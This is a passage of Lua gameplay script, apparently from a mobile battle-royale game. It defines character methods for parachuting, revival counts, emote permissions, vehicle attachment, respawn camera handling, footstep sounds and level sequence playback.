    if Game:IsClassOf(InController, ASTExtraPlayerController) then
      self.ParachuteComponent:InitParachuteData(InController)
    elseif Game:IsClassOf(InController, ANewFakePlayerAIController) and self.ParachuteComponent.InitAIParachuteData then
      self.ParachuteComponent:InitAIParachuteData(InController)
    end
  end
end

function CharacterBase:InitRevivalCount(InController)
  if not self:HasAuthority() then
    return
  end
  local uPlayerState = self:GetPlayerStateSafety()
  if uPlayerState and slua.isValid(uPlayerState) then
    if uPlayerState.InitRevivalCountImpl then
      uPlayerState:InitRevivalCountImpl(InController, self.Object)
    else
      print(bWriteLog and "CharacterBase:InitRevivalCount, have no function InitRevivalCountImpl")
    end
  else
    print(bWriteLog and "CharacterBase:InitRevivalCount, uPlayerState = " .. tostring(uPlayerState))
  end
end

function CharacterBase:HandleUseGlide(InController)
  if self:HasAuthority() then
    self:InitParachutingVehicle()
  end
end

function CharacterBase:HandleEnterGameModeFightingState()
  print(bWriteLog and "CharacterBase:HandleEnterGameModeFightingState")
  if slua.isValid(CGameState) and CGameState:IsCreativeMode() then
    return
  end
  if self:CharacterIsRecycled() then
    print(bWriteLog and "CharacterBase:HandleEnterGameModeFightingState, CharacterIsRecycled = true")
    return
  end
  if slua.isValid(self.Object) and not self:HasAuthority() and self.EmoteBPIDToAnimHandleMap then
    local CheckTable = {
      2206015,
      2206016,
      2206017,
      2206018
    }
    for _, ID in pairs(CheckTable) do
      local EmoteHandle = self.EmoteBPIDToAnimHandleMap:Get(ID)
      if slua.isValid(EmoteHandle) and EmoteHandle.EmoteActionList then
        local NeedStop = false
        for _, Action in pairs(EmoteHandle.EmoteActionList) do
          if Action:GetIsExecuting() then
            NeedStop = true
            break
          end
        end
        if NeedStop then
          self:OnPlayEmoteStop(ID)
        end
      end
    end
  end
end

function CharacterBase:InitParachutingVehicle()
  if self:HasAuthority() then
    if self.bEnsure then
      print(bWriteLog and "CharacterBase:InitParachutingVehicle self.bEnsure")
      return
    end
    local ComponentClass = self.DynamicComponentMap:Get("ParachutingVehicle")
    if ComponentClass then
      local UScriptGameplayStatics = import("ScriptGameplayStatics")
      UScriptGameplayStatics.CreateComponent(self, ComponentClass, "ParachutingVehicle", false)
    else
      print(bWriteLog and "CharacterBase:InitParachutingVehicle not ComponentClass")
    end
  end
end

function CharacterBase:PlayerPoseChange(stLastPoseState, stNewPoseState)
  local ESTEPoseState = import("ESTEPoseState")
  if Client and (self.IsClientPeeking and stNewPoseState == ESTEPoseState.Sprint or stNewPoseState == ESTEPoseState.CrouchSprint) then
    self:NM_ForceSetPeekState(false, false)
  end
end

function CharacterBase:HandleAttachedToVehicle(uVehicle)
  if not slua.isValid(uVehicle) then
    return
  end
  if slua.isValid(self.CharacterMovement) then
    self.CharacterMovement:SetBase(nil, "", true)
  end
  if uVehicle.ForceUseTPP then
    print(bWriteLog and "CharacterBase:HandleAttachedToVehicle, bIsFPPOnVehicle: false", self.Object, uVehicle)
    self.bIsFPPOnVehicle = false
  end
end

function CharacterBase:HandleDetachedFromVehicle(uLastVehicle)
  if not slua.isValid(self.Object) or not slua.isValid(uLastVehicle) then
    return
  end
  if uLastVehicle.ForceUseTPP then
    print(bWriteLog and "CharacterBase:HandleAttachedToVehicle, bIsFPPOnVehicle: true", self.Object, uLastVehicle)
    self.bIsFPPOnVehicle = true
  end
  if Client then
    local Location = self:K2_GetActorLocation()
    if Location.X > -1.0E-5 and Location.X < 1.0E-5 and -1.0E-5 < Location.Y and 1.0E-5 > Location.Y and -1.0E-5 < Location.Z and 1.0E-5 > Location.Z then
      Location = uLastVehicle:K2_GetActorLocation() + FVector(0, 0, 200)
      print(bWriteLog and string.format("CharacterBase:HandleAttachedToVehicle, Vehicle: %s, character location: %s", uLastVehicle, Location))
      self:K2_SetActorLocation(Location, false, nil, true)
    end
  end
end

function CharacterBase:SwitchWeaponBySlotAfterConsume(OldWeaponSlotBeforeSkill)
  print(bWriteLog and "SwitchWeaponBySlotAfterConsume", OldWeaponSlotBeforeSkill)
  local ESurviveWeaponPropSlot = import("ESurviveWeaponPropSlot")
  if OldWeaponSlotBeforeSkill == ESurviveWeaponPropSlot.SWPS_HandProp then
    local Controller = self:GetPlayerControllerSafety()
    if not (slua.isValid(Controller) and GameLuaAPI.IsClassOf(Controller, ASTExtraPlayerController)) or not self:AllowState(EPawnState.SwitchWeapon, false) then
      return
    end
    if self:HasState(EPawnState.WebSwing) and slua.isValid(self.STCharacterMovement) then
      local ESpecialMovementType = import("ESpecialMovementType")
      local ESpiderSwingMoveState = import("ESpiderSwingMoveState")
      local SpiderSwingObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
      if slua.isValid(SpiderSwingObj) then
        local nCurState = SpiderSwingObj:GetCurMoveState()
        if nCurState == ESpiderSwingMoveState.Launching or nCurState == ESpiderSwingMoveState.Swinging then
          print(bWriteLog and "CharacterBase:SwitchWeaponBySlotAfterConsume blocked by SpiderSwing state: " .. tostring(nCurState))
          return
        end
      end
    end
    Controller:ServerAutoSwitchSameSlotWeapon(OldWeaponSlotBeforeSkill)
  else
    self:SwitchWeaponBySlot(OldWeaponSlotBeforeSkill, true, false, false)
  end
end

function CharacterBase:IsEnablePlayerShovleing()
  local EPawnState = import("EPawnState")
  return not self:HasState(EPawnState.Prone) and self:HasState(EPawnState.Sprint)
end

function CharacterBase:OnRep_CarryBackStateChanged()
  local uCarryBackComp = self:GetCarryBackComp()
  if slua.isValid(uCarryBackComp) then
    uCarryBackComp:OnRep_CarryBackStateChanged()
  end
end

function CharacterBase:ShowCharacter(bShow)
  print(bWriteLog and "CharacterBase ShowCharacter", bShow, self.PlayerKey)
  self:SetActorHiddenInGame(not bShow)
end

function CharacterBase:ShowMainWeaponOnBack(bShow)
  local uWeaponMgrCom = self:GetWeaponManager()
  if uWeaponMgrCom and slua.isValid(uWeaponMgrCom) then
    uWeaponMgrCom.ShowMainWeaponModelOnBack = bShow
  end
end

function CharacterBase:AddRevivalCount(nRevivalCount)
  if type(nRevivalCount) == "number" then
    local uPlayerState = self:GetPlayerStateSafety()
    if uPlayerState and slua.isValid(uPlayerState) then
      if uPlayerState.GetRevivalCount and uPlayerState.SetRevivalCount then
        local GeneralRevivalCount = uPlayerState:GetRevivalCount()
        GeneralRevivalCount = GeneralRevivalCount + nRevivalCount
        if GeneralRevivalCount < 0 then
          GeneralRevivalCount = 0
        end
        print(bWriteLog and "CharacterBase:AddRevivalCount, nRevivalCount = " .. tostring(nRevivalCount))
        uPlayerState:SetRevivalCount(GeneralRevivalCount)
      else
        print(bWriteLog and "CharacterBase:AddRevivalCount, Have no function")
      end
    end
  else
    print(bWriteLog and "CharacterBase:AddRevivalCount, type(nRevivalCount) = " .. type(nRevivalCount))
  end
end

function CharacterBase:SetUseDeadBox(bUseDeadBox)
  local eUseDeadBox = 1
  if not bUseDeadBox then
    eUseDeadBox = 0
  end
  printf("revivaldebug CharacterBase SetUseDeadBox PlayerKey:%u, eUseDeadBox:%d ", self.PlayerKey, eUseDeadBox)
  self:SetAttrValue("bUseDeadBox", eUseDeadBox, -1)
end

function CharacterBase:GetUseDeadBox()
  local fUseDeadBox = self:GetAttrValue("bUseDeadBox")
  local nUseDeadBox = math.floor(fUseDeadBox + 0.1)
  return 0 < nUseDeadBox
end

function CharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
  if self.Object == uPawn then
    if AttrName == "bUseDeadBox" then
      self.bIsUseDeadBox = self:GetUseDeadBox()
      print(bWriteLog and "revivaldebug CharacterBase CharacterAttrChangeEvent PlayerKey:, self.bIsUseDeadBox:", self.PlayerKey, self.bIsUseDeadBox)
    elseif AttrName == "IsInUnderGroundArea" then
      self.bIsInUnderGroundArea = AttrVal == 1
      if not Client then
        local ESightVisionCondition = import("ESightVisionCondition")
        local USTExtraModLogicSwitchLibrary = import("STExtraModLogicSwitchLibrary")
        if USTExtraModLogicSwitchLibrary.IsNightVisionUnderGroundOnly() then
          self:SetSightCondition(self.bIsInUnderGroundArea, ESightVisionCondition.NightVisionUnderGround)
        end
      end
    elseif AttrName == "IsAroundUndergroundEntry" then
      self.bIsAroundUndergroundEntry = AttrVal == 1
    elseif AttrName == "EmotePlayRate" then
      if Client then
        local PhotoGrapherSubSystem = SubsystemMgr:Get("PhotoGrapherSubSystem")
        if PhotoGrapherSubSystem then
          PhotoGrapherSubSystem:EmotePlayRateChanged(self.Object, AttrVal)
        end
      end
    elseif AttrName == "AreaID" then
      self:ChangeFootStepValue(AttrVal)
      self:HandleAreaIDChanged(AttrVal)
      if self:IsLocalControlorView() or self:IsLocalViewed() then
        print(bWriteLog and "revivaldebug CharacterBase CharacterAttrChangeEvent PlayerKey:, AreaID", self.PlayerKey, AttrVal)
        EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER, EVENTID_PLAYEREVENT_LOCAL_CHAR_AREA_ID_CHANGED, AttrVal)
      else
        EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER, EVENTID_PLAYEREVENT_CHAR_AREA_ID_CHANGED, AttrVal)
      end
    elseif AttrName == "MapID" then
      if not Client and self:IsAuthority() then
        local uPlayerState = self:GetPlayerStateSafety()
        if slua.isValid(uPlayerState) then
          uPlayerState.MapID = AttrVal
        end
      end
    elseif AttrName == "DanceStageAreaState" and Client then
      EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER, EVENTID_PLAYEREVENT_DANCESTATE_CHANGED, AttrVal, self.Object)
    end
  end
end

function CharacterBase:ChangeFootStepValue(AttrVal)
  if self.DefaultFootStep and AttrVal == 0 then
    return
  end
  local FootStepSoundConfig = GamePlayTools.GetCurrentConfig("FootStepSoundConfig")
  if not FootStepSoundConfig or not FootStepSoundConfig.bOpenAreaFootStep then
    return
  end
  local IntVal = math.tointeger(AttrVal)
  local AreaPara = FootStepSoundConfig[IntVal] or FootStepSoundConfig.DefaultPara
  local DefaultPara = FootStepSoundConfig.DefaultPara
  self.DefaultFootStep = AreaPara == DefaultPara
  self.FloorHeight = AreaPara.FloorHeight or DefaultPara.FloorHeight
  self.GFloorValue = AreaPara.GFloorValue or DefaultPara.GFloorValue
  self.DiffFloorValue = AreaPara.DiffFloorValue or DefaultPara.DiffFloorValue
  print(bWriteLog and "CharacterBase:ChangeFootStepValue, FloorHeight = " .. self.FloorHeight)
  self.bInSoundDiffFloorArea = AreaPara.bInSoundDiffFloorArea or DefaultPara.bInSoundDiffFloorArea
end

function CharacterBase:HandleAreaIDChanged(AttrVal)
  print(bWriteLog and "CharacterBase:HandleAreaIDChanged, AttrVal = " .. tostring(AttrVal))
end

function CharacterBase:HandleOnRespawn()
  printf("revivaldebug CharacterBase HandleOnRespawn")
  if self:IsAuthority() then
    printf(bWriteLog and "revivaldebug CharacterBase HandleOnRespawn self.PlayerKey:%u", self.PlayerKey)
    EventSystem:postEvent(EVENTTYPE_SECURITY, EVENTID_SECURITY_PLAYER_RESPAWN, self.Object)
  else
    local ENetRole = import("ENetRole")
    local uPlayerController = self:GetPlayerControllerSafety()
    if self:IsAutonomousProxy() then
      local UGameplayStatics = import("GameplayStatics")
      local uGameInstance = UGameplayStatics.GetGameInstance(self)
      if slua.isValid(uGameInstance) then
        local uReplay = uGameInstance:GetClientInGameReplay()
        if slua.isValid(uReplay) and uReplay:IsInRecordState() then
          printf("revivaldebug CharacterBase HandleOnRespawn clear deathplayback data")
          uReplay:OnPlayerRespawnNotify()
        end
      end
      local VibrateUtilitySubsystem = SubsystemMgr:Get("VibrateUtilitySubsystem")
      if VibrateUtilitySubsystem and VibrateUtilitySubsystem.HandleCharacterRespawned then
        print(bWriteLog and "CharacterBase.HandleOnRespawn VibrateUtilitySubsystem call HandleCharacterRespawned")
        VibrateUtilitySubsystem:HandleCharacterRespawned()
      end
      if slua.isValid(uPlayerController) and not uPlayerController:IsPureSpectator() and not uPlayerController:IsDemoPlayGlobalObserver() and not uPlayerController:IsDemoPlaySpectator() then
        print(bWriteLog and "CharacterBase.HandleOnRespawn QuitSpectating")
        uPlayerController:QuitSpectating()
        local uViewTarget = uPlayerController:GetViewTarget()
        if slua.isValid(uViewTarget) and slua.isValid(self.Object) then
          if uViewTarget.Role == ENetRole.ROLE_SimulatedProxy then
            print(bWriteLog and "CharacterBase.HandleOnRespawn, SetViewTarget to Owned Pawn 1")
            uPlayerController:SetViewTargetTest(self.Object)
          elseif Game:IsClassOf(uViewTarget, slua.loadClass("/Game/Mod/EvoBase/Arts_PlayerBluePrints/Skill/CarryDeadBox/DeadBoxViewTarget.DeadBoxViewTarget")) then
            print(bWriteLog and "CharacterBase.HandleOnRespawn, SetViewTarget to Owned Pawn 2")
            uPlayerController:SetViewTargetTest(self.Object)
          end
        end
        if uPlayerController:ShouldForceFPPView(self) then
          local EPlayerCameraMode = import("EPlayerCameraMode")
          uPlayerController:SwitchCameraMode(EPlayerCameraMode.PCM_FPP, nil, false, true)
        else
          uPlayerController:SwitchCameraMode(uPlayerController.CurCameraMode, nil, false, true)
        end
      end
      self:AddGameTimer(3, false, function()
        local PlayerRespawnData = slua.IndexReference(self, "PlayerRespawnData")
        if PlayerRespawnData and not PlayerRespawnData.bIsDead and self.CharacterHide and not self.CharacterHide.bCharacterHideIngame and self.bHidden == true and not self:HasState(EPawnState.InPlane) then
          self:SetActorHiddenInGame(false)
        end
      end)
    elseif slua.isValid(self.STCharacterMovement) then
      self.STCharacterMovement.MaxWalkSpeed = 600
    end
    if slua.isValid(uPlayerController) and uPlayerController:IsInSpectating() and uPlayerController:GetLastestViewPlayerKey() == self.PlayerKey then
      printf("revivaldebug CharacterBase HandleOnRespawn ServerObserveCharacter  self.PlayerKey:%u", self.PlayerKey)
      uPlayerController:ServerObserveCharacter(self.PlayerKey)
    end
    if slua.isValid(self.STCharacterMovement) then
      self.STCharacterMovement.GravityScale = 1.0
      local uAttachParentActor = self:GetAttachParentActor()
      if slua.isValid(uAttachParentActor) then
        self:CheckAttachedOrDetachedVehicle(true)
        self.STCharacterMovement:Deactivate()
      end
    end
    if self.Role == ENetRole.ROLE_SimulatedProxy then
      self:RefreshThermalImagingLocal()
    end
  end
  self:LuaBroadcastCommonEventCpp("EVENTTYPE_PLAYEREVENT_CHARACTER", "EVENTID_PLAYEREVENT_REVIVAL", self.PlayerKey, self.Object, self.TeamID)
end

function CharacterBase:HandleOnPreEnterNearDeath(uKillPlayerController, DamageCauser)
  EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_ON_PRE_ENTER_NEAR_DEATH, self)
  if CGameMode and CGameMode.CheckTeammateAllNearDeath then
    CGameMode:CheckTeammateAllNearDeath(self.Object)
  end
end

function CharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
  print(bWriteLog and "CharacterBase:OnParachuteStateChanged", self.Role, LastParachuteState, NewParachuteState)
  local EParachuteState = import("EParachuteState")
  if not Client then
    print(bWriteLog and "CharacterBase:OnParachuteStateChanged, SetNetCullDistanceSquared", NewParachuteState)
    if NewParachuteState == EParachuteState.PS_FreeFall or NewParachuteState == EParachuteState.PS_Opening then
      self:SetNetCullDistanceSquared(900000000)
    else
      self:SetNetCullDistanceSquared(self.DefaultNetCullDistanceSq)
    end
  else
    local ENetRole = import("ENetRole")
    if self.Role == ENetRole.ROLE_AutonomousProxy then
      local EParachuteState = import("EParachuteState")
      if (NewParachuteState == EParachuteState.PS_FreeFall or NewParachuteState == EParachuteState.PS_Opening) and self.SwimComponet and slua.isValid(self.SwimComponet) then
        self.SwimComponet:LeaveWater()
      end
      if self.Role == ENetRole.ROLE_AutonomousProxy and self.HealthStatus == ECharacterHealthStatus.HasLastBreath and (self.ParachuteState == EParachuteState.PS_Opening or self.ParachuteState == EParachuteState.PS_FreeFall) then
        self:SwitchCameraToParachuteOpening()
      end
      if self.HealthStatus == ECharacterHealthStatus.HasLastBreath and LastParachuteState == EParachuteState.PS_Opening and (NewParachuteState ~= EParachuteState.PS_Opening or NewParachuteState ~= EParachuteState.PS_Landing) then
        local uSpringArmComp = self.SpringArmComp
        if slua.isValid(uSpringArmComp) then
          local CrouchHalfHeight = self:GetCrouchHalfHeight()
          CrouchHalfHeight = CrouchHalfHeight or 60
          uSpringArmComp:K2_SetRelativeLocation(FVector(0, 0, -CrouchHalfHeight), false, nil, true)
          local ECameraDataType = import("ECameraDataType")
          uSpringArmComp:SetCameraDataEnable(ECameraDataType.ECameraDataType_NearDeath, true)
          print(bWriteLog and "NearDeathParachute \232\144\189\229\156\176\229\155\158\229\164\141\229\188\185\231\176\167\232\135\130\228\189\141\231\189\174")
        end
      end
      EventSystem:postEvent(EVENTTYPE_INGAME_PARACHUTING, EVENTID_CLIENT_PARACHUTE_STATE_CHANGE, LastParachuteState, NewParachuteState)
    end
  end
  if NewParachuteState == EParachuteState.PS_None then
    EventSystem:postEvent(EVENTTYPE_INGAME_PARACHUTING, EVENTID_PARACHUTING_END, self.Object)
  end
end

function CharacterBase:LuaHandleRepParachuteStateDelegate()
  local ENetRole = import("ENetRole")
  local EParachuteState = import("EParachuteState")
  if not (self and self.Role) or not self.ParachuteState then
    print(bWriteLog and "CharacterBase:LuaHandleRepParachuteStateDelegate Role or ParachuteState is nil")
    return
  end
  print(bWriteLog and "CharacterBase:LuaHandleRepParachuteStateDelegate", self.Role, self.ParachuteState)
  if self.Role == ENetRole.ROLE_SimulatedProxy and self.ParachuteState == EParachuteState.PS_FreeFall then
    print(bWriteLog and "CharacterBase:LuaHandleRepParachuteStateDelegate RefreshParacthueAnimTimer")
    if self.RefreshParacthueAnimTimer then
      self:RemoveGameTimer(self.RefreshParacthueAnimTimer)
      self.RefreshParacthueAnimTimer = nil
    end
    self.RefreshParacthueAnimTimer = self:AddGameTimer(0.5, false, function()
      self:RemoveGameTimer(self.RefreshParacthueAnimTimer)
      self.RefreshParacthueAnimTimer = nil
      if self and slua.isValid(self.Object) then
        print(bWriteLog and "CharacterBase:LuaHandleRepParachuteStateDelegate RefreshParachuteAnim")
        self:TryCacheParachuteAnim()
      end
    end)
  end
end

function CharacterBase:TryCacheParachuteAnim()
  local uCharacter = self.Object
  if not slua.isValid(uCharacter) or not slua.isValid(uCharacter.Mesh) then
    print(bWriteLog and "CharacterBase:TryCacheParachuteAnim Character is nil")
    return
  end
  local CH_ABP_Parachute_Class = slua.loadClass("/Game/Arts_Player/Characters/Animation/Base_AnimBP/Feature/CH_ABP_Parachute.CH_ABP_Parachute")
  local uAnimInstances = uCharacter.Mesh:GetSubAnimInstances()
  print(bWriteLog and "CharacterBase:TryCacheParachuteAnim. uAnimInstances = " .. tostring(uAnimInstances))
  if uAnimInstances and uAnimInstances.Num then
    local num = uAnimInstances:Num()
    print(bWriteLog and "CharacterBase:TryCacheParachuteAnim. num = " .. tostring(num))
    for i = 1, num do
      local uAnimInst = uAnimInstances:Get(i - 1)
      print(bWriteLog and "CharacterBase:TryCacheParachuteAnim. uAnimInst = " .. tostring(uAnimInst))
      if slua.isValid(uAnimInst) and Game:IsClassOf(uAnimInst, CH_ABP_Parachute_Class) and uAnimInst.CacheParachuteAnimVars ~= nil then
        print(bWriteLog and "CharacterBase:TryCacheParachuteAnim. CacheParachuteAnimVars")
        uAnimInst:CacheParachuteAnimVars(true)
        break
      end
    end
  end
end

function CharacterBase:GetBroadcastFatalDamageExpandData(uCauserPawn, uVictimPawn, RealKiller, DamageType, CauserWeaponAvatarID)
  local expandDataStr = ""
  local expandDataTable = self:GetBroadcastFatalDamageExpandDataForLua(uCauserPawn, uVictimPawn)
  if SubsystemMgr then
    local FatalDamageExpandDataSubsystem = SubsystemMgr:Get("FatalDamageExpandDataSubsystem")
    if FatalDamageExpandDataSubsystem then
      expandDataTable = FatalDamageExpandDataSubsystem:GetBroadcastFatalDamageExpandData(uCauserPawn, uVictimPawn, expandDataTable, RealKiller, DamageType)
    end
  end
  expandDataTable = expandDataTable or {}
  expandDataTable.CauserWeaponAvatarID = CauserWeaponAvatarID or 0
  if expandDataTable ~= nil then
    expandDataStr = slua.LuaArchiverEncode(LuaStateWrapper, expandDataTable)
  end
  local ASTExtraBaseCharacter = import("/Script/ShadowTrackerExtra.STExtraBaseCharacter")
  ASTExtraBaseCharacter.SetExpandDataContent(expandDataStr)
  return expandDataStr
end

function CharacterBase:GetBroadcastFatalDamageExpandDataForLua(uCauserPawn, uVictimPawn)
  local expandDataTable = {}
  if uVictimPawn and slua.isValid(uVictimPawn) then
    expandDataTable.bHaveSelfRescueItem = false
    local PlayerState = uVictimPawn:GetPlayerStateSafety()
    if PlayerState and slua.isValid(PlayerState) then
      if PlayerState.CheckCanSelfRescue then
        PlayerState:CheckCanSelfRescue()
      else
        print(bWriteLog and "CharacterBase:GetBroadcastFatalDamageExpandDataForLua, have no function CheckCanSelfRescue, PlayerKey = " .. tostring(uVictimPawn.PlayerKey))
      end
    else
      print(bWriteLog and "CharacterBase:GetBroadcastFatalDamageExpandDataForLua, PlayerState = " .. tostring(PlayerState) .. ", PlayerKey = " .. tostring(uVictimPawn.PlayerKey))
    end
    local CurrentValue = uVictimPawn:GetAttrValue("bCanSelfRescue")
    print(bWriteLog and "CharacterBase:GetBroadcastFatalDamageExpandDataForLua, CurrentValue = " .. tostring(CurrentValue) .. ", PlayerKey = " .. tostring(uVictimPawn.PlayerKey))
    if 0 < CurrentValue then
      expandDataTable.bHaveSelfRescueItem = true
    end
  end
  return expandDataTable
end

function CharacterBase:ServerCheckEmoteCanPlay(EmoteID)
  if not self:CheckEmoteBanTable(EmoteID) then
    print(bWriteLog and "CharacterBase ServerCheckEmoteCanPlay EmoteIsBan" .. tostring(EmoteID))
    return false
  end
  local logic_emote = require("GameLua.Mod.Library.GamePlay.Avatar.Emote.logic_emote")
  if logic_emote.CheckIsDanceTogetherEmote(EmoteID) then
    local EmoteSubSystem = SubsystemMgr:Get("EmoteSubSystem")
    if not EmoteSubSystem:IsInPreListOrDanceList(self.Object) then
      print(bWriteLog and "CharacterBase ServerCheckEmoteCanPlay not in DanceList")
      return false
    end
  end
  return true
end

function CharacterBase:UpdateEmoteExtraInfo(EmoteID, ExtraInfo)
  if EmoteID == 12220605 then
    math.randomseed(os.time())
    local randomNumber = math.random(0, 99)
    return tostring(randomNumber)
  end
  return ExtraInfo
end

function CharacterBase:CheckEmoteBanTable(EmoteID)
  local EmoteData = CDataTable.GetTableData("BattleBanOnEmote", EmoteID)
  if not EmoteData then
    return true
  end
  local uGameState = GameplayData.GetGameState()
  if not slua.isValid(uGameState) or not uGameState.GetGameModeState then
    return true
  end
  if uGameState:GetGameModeState() ~= "ReadyState" then
    return false
  end
  return true
end

function CharacterBase:ReportExceptionOnVehicle(Type, Msg)
  local ErrorMsg = string.format("VehicleException Type:%s, Msg:%s\n", Type, Msg)
  if Client then
    local ClientToolsReport = require("client.slua.logic.report.ClientToolsReport")
    ClientToolsReport:SendReport(ClientToolsReport.Enum_SvrReport_Type.Enum_Vehicle, ErrorMsg)
  end
  if LogExceptionAndReport ~= nil then
    LogExceptionAndReport(ErrorMsg)
    LogExceptionAndReport(ErrorMsg)
  end
end

function CharacterBase:PlayLevelSequenceByPath(SequenceActorPath, LevelSequencePath, TimeOffset)
  print(bWriteLog and Game:GetPlainName(self), "CharacterBase:PlayLevelSequenceByPath", SequenceActorPath, LevelSequencePath, TimeOffset)
  return self:PlayLevelSequenceInternal(SequenceActorPath, LevelSequencePath, nil, TimeOffset)
end

function CharacterBase:PlayLevelSequenceByPathAndBindingInfo(SequenceActorPath, LevelSequencePath, TrackBindingInfo, TimeOffset)
  print(bWriteLog and Game:GetPlainName(self), "CharacterBase:PlayLevelSequenceByPathAndBindingInfo", SequenceActorPath, LevelSequencePath, TrackBindingInfo:Num(), TimeOffset)
  return self:PlayLevelSequenceInternal(SequenceActorPath, LevelSequencePath, TrackBindingInfo, TimeOffset)
end

function CharacterBase:PlayLevelSequenceInternal(SequenceActorPath, LevelSequencePath, TrackBindingInfo, TimeOffset)
  if TimeOffset == nil then
    TimeOffset = 0
  end
  if self.CurrentLevelSequence then
    self:StopCurrentLevelSequence()
  end
  local SequenceTransform = FTransform()
  SequenceTransform:SetLocation(self:K2_GetActorLocation())
  local LevelSeqActor = Game:PlayLevelSequence(self, LevelSequencePath, SequenceTransform, SequenceActorPath, false)
  if not slua.isValid(LevelSeqActor) then
    print(bWriteLog and "CharacterBase:PlayLevelSequenceInternal Error")
    return false
  end
  LevelSeqActor:SetOwner(self)
  if LevelSeqActor.SetMetaData then
    LevelSeqActor:SetMetaData(TrackBindingInfo, TimeOffset)
  end
  print(bWriteLog and "CharacterBase:PlayLevelSequenceInternal", Game:GetPlainName(self), Game:GetPlainName(LevelSeqActor), Game:GetPlainName(LevelSeqActor:GetOwner()))
  self.CurrentLevelSequence = LevelSeqActor
  return true
end

function CharacterBase:StopCurrentLevelSequence()
  if self.CurrentLevelSequence then
    print(bWriteLog and "CharacterBase:StopCurrentLevelSequence", Game:GetPlainName(self.CurrentLevelSequence))
    if slua.isValid(self.CurrentLevelSequence) then
      self.CurrentLevelSequence:StopMontageParticle("DirectorSequence")
      self.CurrentLevelSequence:K2_DestroyActor()
    end
    self.CurrentLevelSequence = nil
  end
end

function CharacterBase:GetCurrentLevelSequenceActor()
  if not slua.isValid(self.CurrentLevelSequence) then
    return nil
  end
  return self.CurrentLevelSequence
end

function CharacterBase:OnLevelSequenceStop(StopType)
  print(bWriteLog and "CharacterBase:OnLevelSequenceStop", StopType)
  if self.CurrentLevelSequence then
    self.CurrentLevelSequence = nil
  end
end

function CharacterBase:HandleCharacterFallingModeChange(bFalling)
  if bFalling then
    return
  end
  if not slua.isValid(self.Object) then
    return
  end
  local uSkillManager = self:GetSkillManager()
  if not slua.isValid(uSkillManager) then
    return
  end
  if slua.isValid(self.Object) then
    self:AddGameTimer(0.05, false, function()
      if self.GetCurSkill then
        local uCurSkill = self:GetCurSkill()
        if slua.isValid(uCurSkill) and uSkillManager:IsCastingSkillID(1000001) and uSkillManager:GetSkillCurPhase(uCurSkill) == 1 then
          local UGameplayStatics = import("GameplayStatics")
          local CurTime = UGameplayStatics.GetRealTimeSeconds(CGameWorld)
          if CurTime - self.LastPlayFallSoundTime > 0.7 then
            print(bWriteLog and "CharacterBase:HandleCharacterFallingModeChange Do PlayFootstepSound deltatime: " .. tostring(CurTime - self.LastPlayFallSoundTime) .. "LastPlayFallTime:" .. tostring(self.LastPlayFallSoundTime))
            self:PlayFootstepSound(4)
          end
        end
      end
    end)
  end
end

function CharacterBase:PlayFootstepSound(eFootStepState)
  self.Super:PlayFootstepSound(eFootStepState)
  if not Client then
    return
  end
  EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER, EVENTTYPE_PLAYEREVENT_CHARACTER_FOOTSTEP_SOUND, self.Object)
end

function CharacterBase:OnRep_bCableCarView()
  self:SwitchFreeView(self.bCableCarView)
end

function CharacterBase:SwitchFreeView(bEnable)
  if not slua.isValid(self.Object) then
    return
  end
  print(bWriteLog and "CableCar:SwitchToFreeView:", self.Object, bEnable)
  local uSpringArmComp = self.SpringArmComp
  if bEnable then
    self.bFreeView = true
    self.bUseControllerRotationYaw = false
    if slua.isValid(uSpringArmComp) then
      uSpringArmComp.bForceUseTargetArmLength = true
      uSpringArmComp.TargetArmLength = 890
    end
  else
    self.bFreeView = false
    self.bUseControllerRotationYaw = true
    if slua.isValid(uSpringArmComp) then
      uSpringArmComp.bForceUseTargetArmLength = false
      uSpringArmComp.TargetArmLength = 220
    end
  end
end

function CharacterBase:IsEnableFollowPlayEmote()
  return LobbySystem.CheckOpen(BP_ENUM_DANCE_FOLLOW_SWITCH)
end

function CharacterBase:IsInteractiveExpression(EmoteID)
  local ItemCfg = CDataTable.GetTableData("Item", EmoteID)
  if ItemCfg and ItemCfg.ItemSubType == 2205 then
    return true
  end
  return false
end

function CharacterBase:CheckCanFollowPlayEmote(EmoteId)
  if not EmoteId or EmoteId == 0 then
    print(bWriteLog and "CharacterBase:CheckCanFollowPlayEmote Can`t Play EmoteId" .. tostring(EmoteId))
    return false
  end
  local FollowEmoteCfg = CDataTable.GetTableData("FollowEmoteCfg", EmoteId)
  if FollowEmoteCfg and FollowEmoteCfg.CanPlay == 0 then
    print(bWriteLog and "CharacterBase:CheckCanFollowPlayEmote No CanPlay" .. tostring(EmoteId) .. "TipsID: " .. tostring(FollowEmoteCfg.TipsID))
    local TipsID = 44697
    if FollowEmoteCfg.TipsID and FollowEmoteCfg.TipsID ~= 0 then
      TipsID = FollowEmoteCfg.TipsID
    end
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(TipsID)
    end
    return false
  end
  if self:IsInteractiveExpression(EmoteId) then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(44697)
    end
    print(bWriteLog and "CharacterBase:CheckCanFollowPlayEmote IsInteractiveExpression" .. tostring(EmoteId))
    return false
  end
  local logic_emote = require("GameLua.Mod.Library.GamePlay.Avatar.Emote.logic_emote")
  if logic_emote.IsMileStoneEmote(EmoteId) then
    return false
  end
  if logic_emote.IsCustomWeaponShow(EmoteId) then
    return false
  end
  return true
end

function CharacterBase:ClearFollowEmote()
  if self:IsAutonomousProxy() then
    print(bWriteLog and "CharacterBase:ClearFollowEmote")
    if self.GetPlayerControllerSafety then
      local Controller = self:GetPlayerControllerSafety()
      if slua.isValid(Controller) then
        Controller.OnShowFollowEmoteDelegate:BroadCast(false)
      end
    end
  end
  if self.ClearEmotePlayer then
    self:ClearEmotePlayer()
  end
end

function CharacterBase:ClearAkEventSound()
  local UAkGameplayStatics = import("AkGameplayStatics")
